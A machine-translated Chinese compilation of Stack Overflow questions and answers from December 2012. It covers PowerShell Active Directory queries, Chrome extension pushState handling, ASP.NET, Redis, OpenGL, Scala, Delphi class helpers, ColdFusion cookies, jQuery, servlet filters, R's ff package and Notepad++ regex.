> 时间：2012-12-10T17:46:33.233
> 
> 标签：powershell, search, ou

我正在尝试编写一个 PowerShell 脚本，该脚本将在 AD 中找到六个月未登录的所有用户，并且不包括 Terminated Users OU 或 Terminated Users\vendors and others OU 中的任何人。我似乎无法排除任何一个 OU。搜索的六个月部分完美运行。

这是我当前的代码：

```
Search-ADAccount -accountinactive -datetime (get-date).AddMonths(-6) -usersonly | ft Name,LastLogonDate | ? {$_.DistinguishedName -notlike "*ou=Terminated Users,*" -and $_.DistinguishedName -notlike "*ou=vendors and others,*"} | Out-File stale_users.txt 
```

我已经从 OU 名称的末尾删除了 ,*，尝试了 - 或，并且自己尝试了每个 OU。它仍然不会跳过搜索那些 OU。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-12-10T18:10:49.293

交换排除代码和“ft”或“格式表”的顺序。您正在将数据格式化为没有 DistinguishedName 字段的位置，然后尝试匹配该缺失的字段。

```
Search-ADAccount -accountinactive -datetime (get-date).AddMonths(-6) -usersonly | `
  ? {$_.DistinguishedName -notlike "*ou=Terminated Users,*" -and $_.DistinguishedName -notlike "*ou=vendors and others,*"} |`
  ft Name,LastLogonDate |`
  Out-File stale_users.txt 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2020-05-08T11:06:06.657

@Mark 提出的解决方案对我不起作用（Windows Server 2016），这个有效

```
Search-ADAccount -accountinactive -datetime (get-date).AddMonths(-6) -usersonly | `
  ? {$_.DistinguishedName -notmach "ou=Terminated Users|ou=vendors and others"} |`
  ft Name,LastLogonDate |`
  Out-File stale_users.txt 
```

# javascript - 通过history.pushState更改页面时如何在谷歌浏览器扩展中插入内容脚本？

> ID：13806307
> 
> 赞同：11
> 
> 时间：2012-12-10T17:46:59.987
> 
> 标签：javascript, google-chrome, google-chrome-extension, browser-history, vk

我正在为网站创建一个小的 google chrome 扩展，我想在特定页面上更改一些 html。

问题是网站通过 ajax 加载他的内容，并大量使用 history.pushState API。所以，我添加了这个东西来表现：

```
"content_scripts": [
   {
     "matches": ["http://vk.com/friends"],
     "js": ["js/lib/jquery.min.js", "js/friends.js"],      
   },
 ] 
```

当我第一次打开页面或重新加载它时，一切正常。但是当我在网站页面之间导航时，chrome 不会在“/friends”页面上插入我的脚本。我认为发生这种情况是因为 URL 实际上并没有改变。他们使用 history.pushState() 因此，chrome 无法再次插入/重新运行我的脚本。

有什么解决办法吗？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2013-07-11T03:26:31.797

我能够得到这个工作。来自[webNavigation 的 Chrome 扩展文档](http://developer.chrome.com/extensions/webNavigation.html#event-onHistoryStateUpdated)：

您需要`webNavigation`在**manifest.json**中设置权限：

```
 "permissions": [
     "webNavigation"
  ], 
```

然后在**background.js**中：

```
 chrome.webNavigation.onHistoryStateUpdated.addListener(function(details) {
        console.log('Page uses History API and we heard a pushSate/replaceState.');
        // do your thing
  }); 
```

* * *

## 回答 #2

> 赞同：7
> 
> 时间：2012-12-11T08:33:59.560

您可以在内容脚本中添加一个[window.onpopstate](https://developer.mozilla.org/en-US/docs/DOM/window.onpopstate)事件并监听它，当事件触发时，您可以再次重新运行内容脚本。

**参考**

*a)* [extension.sendMessage()](https://developer.chrome.com/extensions/extension.html#method-sendMessage)

*b)* [extension.onMessage().addListener](https://developer.chrome.com/extensions/extension.html#event-onMessage)

*c)* [tabs.executeScript()](https://developer.chrome.com/extensions/tabs.html#method-executeScript)

*d)* [history.pushState()](https://developer.mozilla.org/en-US/docs/DOM/Manipulating_the_browser_history)

*e)* [window.onpopstate](https://developer.mozilla.org/en-US/docs/DOM/window.onpopstate)

**示例演示：**

***清单.json***

确保内容脚本注入 URL 和所有 API 的选项卡在清单文件中具有足够的权限

```
{
    "name": "History Push state Demo",
    "version": "0.0.1",
    "manifest_version": 2,
    "description": "This demonstrates how push state works for chrome extension",
    "background":{
        "scripts":["background.js"]
    },
    "content_scripts": [{
        "matches": ["http://www.google.co.in/"],
        "js": ["content_scripts.js"]
     }],
    "permissions": ["tabs","http://www.google.co.in/"]
} 
```

***content_scripts.js***

跟踪 onpopstate 事件并向后台页面发送请求以重新运行脚本

```
window.onpopstate = function (event) {
    //Track for event changes here and 
    //send an intimation to background page to inject code again
    chrome.extension.sendMessage("Rerun script");
};

//Change History state to Images Page
history.pushState({
    page: 1
}, "title 1", "imghp?hl=en&tab=wi"); 
```

***背景.js***

跟踪来自内容脚本的请求并将脚本执行到当前页面

```
//Look for Intimation from Content Script for rerun of Injection
chrome.extension.onMessage.addListener(function (message, sender, callback) {
    // Look for Exact message
    if (message == "Rerun script") {
        //Inject script again to the current active tab
        chrome.tabs.executeScript({
            file: "rerunInjection.js"
        }, function () {
            console.log("Injection is Completed");
        });
    }
}); 
```

***rerunInjection.js***

一些琐碎的代码

```
console.log("Injected again"); 
```

**输出**

![在此处输入图像描述](../Images/1d6ca9eb1e83e1b1e2d6665c90a66ecb.png)

如果您需要更多信息，请与我们联系。

# asp.net - FindControl 在修改后的 DetailsViewControlCollection 中不起作用

> ID：13806309
> 
> 赞同：0
> 
> 时间：2012-12-10T17:47:04.100
> 
> 标签：asp.net, detailsview, findcontrol

这可能是我做错了的另一种情况。我责备自己。

但是我对 DetailsView 中 FindControl 的行为感到困惑，如下所示。

FindControl 一直有效，直到我从 DataControlFieldCollection 中删除了一个字段。如果重要的话，这是在 MasterPage 中。

我已经尝试移动删除 Page_Load、Page_PreRender 中的 DataControlField 以及 dvCategories 的 ModeChanged 和 ModeChanging 事件的代码。

我也试过从很多地方调用 dvCategories.Databind() 无济于事。

这是预期的行为，是否有解决方法？

```
protected void ldsCategories_OnInserting(object sender, LinqDataSourceInsertEventArgs e)
{
    //Here findcontrol works unless the commented code from the button event handler is fired.
    TextBox tb = (TextBox) dvCategories.FindControl("txtInsertParentId");
    string ParentName = tb.Text;

}

protected void btnNew_click(object sender, EventArgs e)
{
    dvCategories.ChangeMode(DetailsViewMode.Insert);
    //dvCategories.Fields.RemoveAt(3);

} 
```

ASP 代码：

```
 <asp:DetailsView ID="dvCategories" runat="server" AutoGenerateEditButton="True" AutoGenerateInsertButton="True" DataSourceID="ldsCategories" AutoGenerateRows="False" DataKeyNames="CategoryId" DefaultMode="ReadOnly">
        <Fields>
            <asp:BoundField DataField="CategoryId" HeaderText="CategoryId" InsertVisible="False" ReadOnly="True" SortExpression="CategoryId" />
            <asp:BoundField DataField="Name" HeaderText="Name" SortExpression="Name" />
            <asp:TemplateField HeaderText="Parent Name">
                <InsertItemTemplate>
                    <asp:TextBox ID="txtInsertParentId" runat="server"></asp:TextBox>
                </InsertItemTemplate>
            </asp:TemplateField>
            <asp:BoundField DataField="ContentPath" HeaderText="ContentPath" SortExpression="ContentPath" />
            <asp:BoundField DataField="DisplayUrl" HeaderText="DisplayUrl" SortExpression="DisplayUrl" />
            <asp:BoundField DataField="MetaDesc" HeaderText="MetaDesc" SortExpression="MetaDesc" />
        </Fields>    
</asp:DetailsView>

<asp:LinqDataSource ID="ldsCategories" runat="server" ContextTypeName="ProductsDataContext" TableName="Categories" EnableInsert="True" EnableUpdate="True" OnInserting="ldsCategories_OnInserting" EntityTypeName="" Where="CategoryId == @CategoryId &amp;&amp; Name == @Name" OnInserted="ldsCategories_OnInserted">
    <WhereParameters>        
        <asp:ControlParameter ControlID="txtCategory" Name="Name" PropertyName="Text" Type="String" DefaultValue="" />
    </WhereParameters>
    </asp:LinqDataSource> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:31:23.600

我真的是个假人。我不需要删除该字段，只需将其隐藏即可。

所以这有效：

```
dvCategories.Fields[3].Visible = false; 
```

FindControl 也适用于这种技术。我仍然不知道为什么修改集合会破坏 findcontrol ......

# actionscript-3 - 在 FDT5.6 中编译 Air 应用程序？

> ID：13806314
> 
> 赞同：0
> 
> 时间：2012-12-10T17:47:29.473
> 
> 标签：actionscript-3, air, fdt

我下载了 fdt 的最新版本，我创建了 air 项目，当我想编译和测试它时给我一个错误：

`An internal error occurred during: "Compile"`.

```
java.lang.NullPointerException 
```

# node.js - 您如何使用 Redis 查看频道中的内容？

> ID：13806326
> 
> 赞同：1
> 
> 时间：2012-12-10T17:48:44.063
> 
> 标签：node.js, redis

我在 Windows 7 上使用 nodejs，并且有一个发布消息的客户端和另一个订阅它的客户端。目前我没有对发布的消息做任何事情。换句话说，没有 client1.on("message",...) 方法来处理消息。

我可能错了，但我认为即使我没有处理消息，消息也必须保留在持久队列中？

如果是这样，我如何查看队列中的内容？

我刚开始看 Redis api，看不到任何查看频道的命令。

# c++ - OpenGL喷泉模拟

> ID：13806327
> 
> 赞同：0
> 
> 时间：2012-12-10T17:48:46.693
> 
> 标签：c++, opengl, simulation

我的任务是创建一个带有水粒子和水面碰撞的喷泉模拟。至此，我已经使用一个着色器创建了水面，另一个着色器创建了喷泉粒子（喷泉粒子的着色器也使用了变换反馈机制）。

我的问题是：如何制作/检测喷泉粒子和水面碰撞？- 我想知道，我如何从平面的着色器/GL 缓冲区和粒子的着色器/GL 缓冲区获取/连接信息以进行碰撞 - 我知道水波方程和碰撞检测方法 - 我只是不知道为什么允许 OpenGL 的 API。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-10T18:42:12.113

您描述的问题与 OpenGL 的工作描述不符。OpenGL是一个绘图API，它的目的是画出漂亮的图片。诸如碰撞检测之类的事情完全超出了 OpenGL 的范围。

但是，您可以使用 OpenGL 实现基于图像的算法来执行与您的问题匹配的基于图像的测试。在您的情况下，我会在正交投影中从顶部渲染水面，然后在启用深度测试的情况下渲染每个粒子。使用*遮挡查询*我会测试粒子是否仍然可见。对于每一帧，我都会比较粒子可见性是否发生变化：如果它消失了，它就会进入水下并发生碰撞。

这种方法有效，但坦率地说，我会说它完全被过度设计了。只需测试地面以上的颗粒高度是否大于平均水位；对于小的波纹波，这是足够准确的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:41:59.033

您需要做的是调查 OpenCL 与 OpenGL 互操作的可能性。[在此处](http://developer.download.nvidia.com/compute/cuda/3_0/sdk/website/OpenCL/website/samples.html#oclParticles)查找显示使用 OpenCL（使用 OpenGL 渲染）进行粒子碰撞模拟的 nVidia 示例。OpenGL 作为计算 API 是非常有限的，如果不跳槽就很难做你想做的事（我想有可能——只是不太容易）。

# cakephp - 网站的几个部分由使用单核的应用程序管理？

> ID：13806332
> 
> 赞同：0
> 
> 时间：2012-12-10T17:49:02.387
> 
> 标签：cakephp

是否可以**使用相同的核心在单个应用程序中管理****国际化网站**（内容和界面）的**不同部分**（论坛、博客、投资组合）。

 ****每个部分都有自己的视图/控制器/模型，所有这些都由一个核心管理。

例子：

```
/en/home 
/en/about
/en/contact
        /en/blog/
        /en/blog/article

        /en/forum/
        /en/forum/category/
        /en/forum/category/topic/
        /en/forum/category/topic/post

/fr/accueil 
/fr/a-propos
/fr/contact
        /fr/blog/
        /fr/blog/article

        /fr/forum/
        /fr/forum/categorie/
        /fr/forum/categorie/sujet/
        /fr/forum/categorie/sujet/message 
```

**谢谢**

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-11T01:04:50.220

那是什么`AppModel`，`AppController`并且`AppHelper`是为了。所有插件类都应该从这些扩展，允许您创建全局方法。

您应该查看一些使用 CakePHP 构建的应用程序以获得更多想法，[Infinitas](http://github.com/infinitas)和[Croogo](http://github.com/croogo)。它们都有一个带有“插件”的“核心”，例如您在此处列出的内容。

你可以用这样的东西[做](http://nuts-and-bolts-of-cakephp.com/2008/11/28/cakephp-url-based-language-switching-for-i18n-and-l10n-internationalization-and-localization/)`/en`/位`/fr`****

# html - 如何使 div 填充剩余的屏幕空间和具有相同高度的内部 div？

> ID：13806333
> 
> 赞同：-1
> 
> 时间：2012-12-10T17:49:04.307
> 
> 标签：html, css

我创建了以下网页。

CSS：

```
*
{
    margin: 0;
}

html, body
{
    height: 100%;
}

#wrapper
{
    min-height: 100%;
    height: auto !important;
    height: 100%;
    margin: 0 auto -44px; /* -44px being the size of the footer */
}

#header
{
    width: 100%;
    height: 60px;
    background: #e6e6e6;
}

#headerPlace
{
    width: 990px;
    height: 60px;
    margin: 0 auto;
    background: #ddd;
}

#content
{
    overflow: hidden;
    width: 990px;
    margin: 0 auto;
}

.content-1
{
    float: left;
    margin-right: -1px; /* Thank you IE */
    width: 190px;
    background: #bfb;
    padding-bottom: 500em;
    margin-bottom: -500em;
}

.content-2
{
    float: right;
    width: 800px;
    background: Aqua;
    padding-bottom: 500em;
    margin-bottom: -500em;
}

#footer, #push
{
    height: 44px;
}
#push
{
    width: 990px;
    margin: 0 auto;
    background: Aqua;
}

.content-1-push
{
    float: left;
    width: 190px;
    background: #bfb;
    position: absolute;
}

.content-2-push
{
    float: right;
    width: 800px;
    background: Aqua;
    position: absolute;
}
#footer
{
    width: 100%;
    background: #e6e6e6;
}

a img
{
    border: none;
} 
```

HTML：

```
<body>
    <div id="wrapper">
        <div id="header">
            <div id="headerPlace">
                <a href="Default.aspx">
                    <img src="siteImages/logo.jpg" class="logo" />
                </a>
            </div>
        </div>
        <div id="content">
            <div class="content-1">
                content-1
            </div>
            <div class="content-2">
                content-2 content-2 content-2 content-2 content-2 content-2 content-2 content-2
                content-2 content-2 content-2 content-2 content-2 content-2 content-2 content-2
                content-2 content-2 content-2 content-2 content-2 content-2 content-2 content-2
                content-2 content-2 content-2 content-2 content-2 content-2 content-2 content-2
                content-2 content-2 content-2 content-2 content-2 content-2 content-2 content-2
                content-2 content-2 content-2 content-2 content-2 content-2 content-2 content-2
                content-2 content-2 content-2 content-2 content-2 content-2 content-2 content-2
                content-2 content-2 content-2 content-2 content-2 content-2 content-2 content-2

            </div>
        </div>
        <div id="push">
            <div class="content-1-push">
            </div>
            <div class="content-2-push">
            </div>
        </div>
    </div>
    <div id="footer">
        footer</div>
</body> 
```

但是，我希望 content-1 部分与 content-2 的高度相同；也就是说，背景颜色不会显示在 content-1 下方，如附图所示。

![CSS样式； 浏览器显示](../Images/4281713f63e8e4b75d6d6e343e0bf35a.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T22:28:47.813

看看这个[jsfiddle](http://jsfiddle.net/BrPzC/)。它应该让你走上正确的道路。

简单解释一下，您要为类设置 ，`min-height: 100%;`以`.content`确保它将拉伸到内容占用的最大高度或页面的最大高度。然后你给你`content-2` `div`一个`absolute`位置并将左边距设置为`content-1`.

# scala - View Bound 方法、有序 Trait 和隐式转换

> ID：13806335
> 
> 赞同：3
> 
> 时间：2012-12-10T17:49:09.830
> 
> 标签：scala, sorting

如果我有一个具有以下签名的方法：

```
def max[T <% Ordered[T]](list:List[T]): T={ 
 //return max. element of List (for example)
} 
```

我想给它一个这样的对列表：

```
val fu:List[Pair[String, Double]] = List(Pair("a", 3.1),Pair("b", 1.7),Pair("c", 3.1),Pair("d", 5.4)) 
```

如何定义列表第二个元素的排序，以便能够在函数中使用它？

我试着用

```
implicit def wrapper(p: Pair[String, Double])=new runtime.RichDouble(p._2) 
```

将双精度对隐式转换为扩展有序特征的 RichDouble，但这不起作用。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-12-10T18:07:33.480

给定：

```
scala> def max[T <% Ordered[T]](xs: List[T]) = xs.max
max: [T](xs: List[T])(implicit evidence$1: T => Ordered[T])T

scala> case class Pair(x: String, y: Double)
defined class Pair 
```

您需要定义订购对象`Pair`：

```
scala> implicit val order = scala.math.Ordering.by[Pair, Double](_.y)
order: scala.math.Ordering[Pair] = scala.math.Ordering$$anon$7@3b2e9a90 
```

然后你会发现你的`max`函数适用于`Pair`s

```
scala> max(List(Pair("foo", 1), Pair("bar", 2), Pair("baz", 2.2)))
res5: Pair = Pair(baz,2.2) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T18:59:17.013

你为什么不使用`maxBy`？

```
scala> val xs = ('c',3) :: ('a',1) :: ('b',2) :: Nil

scala> val x = xs maxBy(_._2)

//x == ('c',3) 
```

# delphi - Delphi XE2 中的类助手和类拦截器

> ID：13806338
> 
> 赞同：4
> 
> 时间：2012-12-10T17:49:24.027
> 
> 标签：delphi, delphi-xe2

我有一段代码，如下所示：

接口部分：

```
TControlOrganizer = class(TComponent)  // a kind of List of TControl
private
  FList : TList;  //Handling list of TControl
  ..............
end;

TControlHelperAdd = class // Just for separating value entered by user and value produced by code
  private
    FOrganizer : TControlOrganizer;
    FOrigValue : String;
    FUserValue : String;
end;

TControlHelper = class helper for TControl  //Basic helper for TControl
  private
    class var
      FAddProp : TControlHelperAdd;
  protected
    procedure SetOrganizer(Value : TControlOrganizer);
    function getOrganizer:TControlOrganizer;
  public
    class Constructor doinit;
    class Destructor deinit;
    procedure OrganizerChanged;virtual;
  published
    Property Organizer:TControlOrganizer read getOrganizer write setOrganizer; //Problem No.1
  end;

//Helper for CustomEdit inherited from TControlHelper
TCustomEditHelper = class helper(TControlHelper) for TCustomEdit
  protected
    procedure OrganizerChanged;override;
  end;
//TEdit : interceptor
TEdit= class(StdCtrls.TEdit)
  protected
    procedure Change;override;  //problem No.3
end; 
```

实施部分：

```
{TControlHelper}

class Constructor TControlHelper.doinit;
begin
  FAddProp :=TControlHelperAdd.Create;
end;

class Destructor TControlHelper.deinit;
begin
  FreeAndNil(FAddProp);
end;

procedure TControlHelper.OrganizerChanged;
begin
end;

procedure TControlHelper.SetOrganizer(Value : TControlOrganizer);
begin
  if FAddProp.FOrganizer<>value then begin
     if assigned(FAddProp.FOrganizer) then begin
       FAddProp.FOrganizer.remove(self);
     end;
     FAddProp.FOrganizer:=value;
     if assigned(FAddProp.FOrganizer) then begin
       FAddProp.FOrganizer.Add(self);
     end;
     OrganizerChanged;  //Problem No.2
  end;
end;

function TControlHelper.getOrganizer:TControlOrganizer;
begin
  result:=FAddProp.FOrganizer;
end;

{TCustomEditHelper}
procedure TCustomEditHelper.OrganizerChanged; //problem No.2
begin
  if assigned(FAddProp) then begin
    if assigned(Organizer) then begin
      FAddProp.FOrigValue:=Text;
      FAddProp.FUserValue:=Text;
    end;
  end;
end;

{TEdit = Interceptor} 
procedure TEdit.Change; //Problem No.3
begin
  inherited Change;
  FAddProp.FUserValue:=Text;
end; 
```

我发现了 3 个我自己无法解决的问题。

问题 1：已发布的属性属性未显示在对象检查器中。我想我犯了一个错误，在这里忘记了一些东西。

问题 2：如上所示，来自类助手的重写方法没有触发（没有工作）。

问题 3：如上所示的拦截器类中的重写方法没有触发（没有工作）。

任何人都可以帮我找出问题所在吗？感谢您的帮助，并为我糟糕的英语感到抱歉。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-10T18:30:52.733

**问题 1**

> 助手中的已发布属性不会显示在对象检查器中。

这是正确的。在助手中声明的属性永远不会出现在对象检查器中。

**问题 2**

> 虚拟方法在类助手中无效。

同样，这是设计使然。尽管编译器允许您在帮助程序中定义虚拟方法，但它没有任何作用。为了`TCustomEditHelper.OrganizerChanged`射击，`TCustomEditHelper`需要成为目标对象的主动助手。

**问题 3**

> `Change`我截获的类的方法`TEdit`没有触发。

那是因为您没有实例化被拦截的`TEdit`. 如果您实例化正确的类，即您定义的拦截器类，该方法将触发。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-23T20:27:45.030

辅助类可以被认为是一个常规的非面向对象的函数，它接受对象作为它的第一个参数。助手让您可以隐藏它并像调用方法一样编写代码。如果您将它们视为简单的函数，那么您就会明白为什么它们不会出现在对象检查器中或使用访问对象内部的任何地方（如虚拟方法表、调度方法和发布的属性），因为没有内部对象的变化。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-07-11T11:28:07.870

但是，我找到了解决方案。

```
TControlHelper = class helper for TControl
protected
function GetTest: Integer;
end;

TMyThing = class (TControl)
published
property Test: Integer read GetTest;
end; 
```

Integer 类型在这里是有条件的，它可能是您需要的类，它的一个实例`TControlHelper`将切入您，例如， `Spring.Services.ServiceLocator`通过在第一次调用时创建它。关键是自我

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2021-07-11T10:35:23.077

这样的决定不言自明。

```
TControlHelper = class helper for TControl
private
    function GetTest: Integer;
protected
    property Test: Integer read GetTest;
end;

TMyThing = class(TControl)
published
    property Test;
end; 
```

您将看到 Test in designtime 属性。但是，在编译实际项目时，我们得到 [dcc32 Fatal Error] F2084 Internal Error: AV0A967995(0A8F0000)-R00000000-0

# cookies - Coldfusion 10 cookie 数据丢失

> ID：13806339
> 
> 赞同：4
> 
> 时间：2012-12-10T17:49:24.687
> 
> 标签：cookies, coldfusion, coldfusion-10

我正在从 Coldfusion 9 过渡到 Coldfusion 10 服务器。我注意到我的登录 cookie（从 .NET 生成）在 Coldfusion 中读取时丢失数据的问题。IE，一个应该读取的cookie：

> EMAIL=user@hotmail.com&ID=9994171&CONTENT_SECURITY=MBR CO CFO PFS MC CL RE STF PA SP SC HCC&FIRST_NAME=Jack&LAST_NAME=Smith&FULL_NAME=Jack Smith&CHAPTER=047&TITLE_SEGMENT=中层/执行&TITLE_SEGMENT_DESC=其他&PAID_THRU=5/31/2014 AM&MEMBER_TYPE=STF&MEMBER_STATUS=A&IS_MEMBER=假&ELIGIBLETOJOIN=假&IS_STAFF=是

仅在 CF10 中读取为：

> 电子邮件

似乎任何特殊字符都会导致这种情况，因为我在空格、= 等上看到它。有没有人遇到过这个问题或对此原因有一些意见？我不想因此而重新编写我的安全性，但我很难理解这个开关。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-10-28T03:13:52.150

使用 GetHTTPRequestData() 方法。

```
_cookie = GetHttpRequestData().headers.cookie; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-05-16T17:21:11.773

刚刚想出了同样的问题。我们正在使用具有固定长度的 cookie 值。出于某种原因，CF10 没有显示单个 cookie 值，因此我们抓取了所有 cookie 的字符串，然后搜索 cookie 值开始的位置并提取值。（感谢 Sanjeev 让我朝着正确的方向开始）

```
<cfset allcookies = GetHttpRequestData().headers.cookie>

<!--- Finds the string where your cookie starts --->
<cfset yourCookie = Find("sampleSting", allcookies) >

<!--- Grabs a six digit number after the seven digit cookie string. --->
<cfset yourVariable = MID(allcookies,(sampleString+7),6)> 
```

# compiler-construction - 是否有任何用于编译器的代码生成和优化工具（我生成了 AST 树）？

> ID：13806341
> 
> 赞同：0
> 
> 时间：2012-12-10T17:49:26.590
> 
> 标签：compiler-construction, code-generation, compiler-optimization

我已经进入了制作自己的编译器的最后一步。如果我有 AST，是否有任何工具（eclipse 集成会更好）用于生成汇编代码并自动优化它。如果存在一些工具包，哪个一个更好？

# jquery - 关闭褪色的 div 不起作用

> ID：13806345
> 
> 赞同：-1
> 
> 时间：2012-12-10T17:49:36.913
> 
> 标签：jquery

我有这样的代码：

```
$(document).ready( function(){    

$('.cod').click(function() {
var div_name = $(this).attr('id');

$('.overlay_window').load('/templates/' + div_name + '_template.php', function(){
   var div_width = $('#'+div_name+'-overlay').width();
   var div_height = $('#'+div_name+'-overlay').height();
    $('.overlay_window').css("width", ""+div_width+"px")
    $('.overlay_window').css("height", ""+div_height+"px")
    var div2_width = $('.overlay_window').width();
    var div2_height = $('.overlay_window').height();
    var window_width = $(window).width();
    var window_height = $(window).height();

    var widthoffset = (window_width - div2_width) / 2;  
    var heightoffset = (window_height - div2_height) / 2;   
    $('.overlay_window').css("left", "" + (widthoffset) + "px");
    $('.overlay_window').css("top", "" + (heightoffset) + "px");
    $('.overlay_background').fadeIn();
    $('.overlay_window').fadeIn();
  });
});

$('#zamknij').click(function() {
  return false;
  $('.overlay_background').hide();
  $('.overlay_window').hide();
});

}); 
```

和 HTML

```
<?php
session_start();
?>
<div id="invite-overlay" style="width:400px; height:200px; ">
Zaproś swojego znajomego do grona <b>Levelowiczów</b>!&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<a href="javascript:void(0);" id="zamknij" style="color:#aaaaaa; font-family:Bebas; cursor:pointer; text-decoration:none;">X Zamknij</a><br /><br />
Już teraz możesz zaprosić znajomego, aby zarejestrował się z twojego <b>Ref Linku</b>, dzięki czemu uzyskasz punkty, które wymienia się na nagrody w konkursach.<br /><br />
<b>Oto twój link:</b><br />

<input style="width:400px; height:25px; border:none; background:#ffffff; border-top:1px solid #e2e2e2; border-left:1px solid #e2e2e2;" type="text" readonly="readonly" value="<?php echo("http://xxx/register.php?ref_link=" .  $_SESSION['uniq_key'] . ""); ?>">
</div> 
```

我想在单击 X Zamknij 时隐藏所有这些

```
$('.overlay_background').hide();
$('.overlay_window').hide(); 
```

这部分在 index.php 文件中并且是隐藏的。它是出现在窗口中心的窗口的容器

编辑

覆盖div的部分

```
<body>
<div class="overlay_background"></div>
<div class="overlay_window"></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-10T17:57:07.353

当您`return false;`在函数中执行操作时，它会停止函数的执行，因此您`return false;`需要像这样在函数的末尾：

```
$('#zamknij').click(function() {
  $('.overlay_background').hide();
  $('.overlay_window').hide();
  return false;
}); 
```

您应该从单击中获取#zamknij 的单击处理程序绑定调用，就像我在 JSFiddle 上所做的那样。

请参阅此 JSFiddle 以获取实时示例：http: [//jsfiddle.net/A6UZ9/2/](http://jsfiddle.net/A6UZ9/2/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-10T17:57:01.577

您是否尝试将`return false;`语句移动到单击处理程序的底部`#zamknij`？它下面的代码无法运行。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-10T17:57:55.950

### 移动`return false`到最后：

```
$('#zamknij').click(function() {
  $('.overlay_background').hide();
  $('.overlay_window').hide();
  return false;
}); 
```

# jsp - 如何在服务器发送响应之前使用 servlet 过滤器拦截页面请求，将 jsessionid 附加到响应 URL

> ID：13806352
> 
> 赞同：0
> 
> 时间：2012-12-10T17:49:59.987
> 
> 标签：jsp, session, tomcat, servlet-filters, jsessionid

我有一个 servlet 过滤器，它接受 jsessionid 并将其附加到响应中。但是，它无法正常工作，因为应用程序陷入了无限循环。代码*看起来*是正确的，但是 Tomcat 如何处理请求和响应是混淆的地方。

下面是 doFilter 方法（destroy 和 init 为空）：

```
public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain) throws IOException, ServletException {

    if ((request instanceof HttpServletRequest) && (response instanceof HttpServletResponse)) {

        HttpServletRequest rQ = ((HttpServletRequest)request);
        HttpServletResponse rS = ((HttpServletResponse)response);

        if ((!request.isSecure())) {

            String uRL = rS.getRequestURL().toString();
            String qS = (rS.getQueryString() == null) ? "" : rS.getQueryString();
            String sID = rS.getSession().getId();
            String redirectURL = uRL + ";jsessionid=" + sID + qS;

            rS.sendRedirect(redirectURL);
        }
        else {

            chain.doFilter(request, response);
        }
    }
} 
```

我已将过滤器应用于所有 JSP 页面。我看到发生的是一个 http JSP 页面被调用——我们称之为 Content.jsp——servlet 获取这个页面并附加 jsessionid。然后，再次调用 Content.jsp，因为我应用了调用所有 JSP 页面的规则，并且它不断重定向。

要么我必须更改我的代码，要么以某种方式在 servlet 访问页面之前拦截它。我该如何解决这个问题？也许，我可以检查 jsessionid 是否附加到 URL 但我怎么能这样做？？？

谢谢你。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-10T18:11:55.423

如果我没看错，我希望它会无限循环。

`!request.isSecure()`，正在询问“客户端是否使用了 https？”。由于重定向永远不会改变这个特性，重定向也不会使用 https 并再次进入那个 if-block。

我建议 if 语句应该检查 jsessionid 是否未在 url 中设置。

# r - 删除行ff包

> ID：13806353
> 
> 赞同：5
> 
> 时间：2012-12-10T17:50:03.547
> 
> 标签：r, ff, ffbase

一段时间以来，我一直在使用 ff 包来处理大数据。我使用过的 R 对象有大约 130.000.000 行和 14 列。其中两列温度和降水缺少值“NA”，因此我需要删除这些行才能继续我的工作。我一直在尝试像在普通 R 对象中那样做：

```
data<-data[!is.na(data$temp),] 
```

但我不断收到错误消息：

```
Error: vmode(index) == "integer" is not TRUE 
```

有没有人能够删除 ffdf 对象中的行？我会很感激任何帮助。

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-12-10T20:00:38.290

基于逻辑 ff_vector 的索引在 ff 中是不可能的，您需要提供一个 ff 整数向量。这就是错误消息试图告诉您的内容。所以你可以像这样做子集

```
require(ffbase)
idx <- !is.na(data$temp)
idx <- ffwhich(idx, idx == TRUE)
data <- data[idx, ] 
```

或（使用 ffbase 6.3 版）

```
require(ffbase)
data <- subset(data, !is.na(temp)) 
```

# notepad++ - 在每行之后添加文本，多个条目

> ID：13806355
> 
> 赞同：16
> 
> 时间：2012-12-10T17:50:22.523
> 
> 标签：notepad++, notepad

我只是在寻找一种方法来加快在记事本应用程序中的每一行之后添加信息的过程。

我有一个记事本文件，其中包含许多条目，大约 1000+，并且正在寻找一种在每一行之后添加“”的方法，但是我不能简单地搜索和替换，因为每一行都不同于另一行。有没有另一种方法可以在每行之后简单地添加三个字符而不管它们是什么？

* * *

## 回答 #1

> 赞同：33
> 
> 时间：2012-12-10T18:00:10.020

你可以通过点击 Cntrl+F 然后检查正则表达式框来做到这一点。然后把你想用什么东西替换掉。您可以将正则表达式查找为

```
 \r 
```

并将其替换为

```
 "YOUR TEXT"\r 
```

![在此处输入图像描述](../Images/0c3ab2b0abaafdc01e9be0b06cc49923.png)

* * *

## 回答 #2

> 赞同：18
> 
> 时间：2012-12-10T17:57:31.390

[获得一个像Notepad++](http://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&cad=rja&ved=0CC4QFjAA&url=http://notepad-plus-plus.org/&ei=CyLGUJTyO83wrQef34CQDw&usg=AFQjCNH20Y39KL3umNlz40yN398ALm0wKg)这样好的文本编辑器，然后使用 Find/Replace 框。在搜索模式部分中选择正则表达式单选按钮。搜索`$`（这是行尾标记），并替换为您想要的任何文本。

* * *
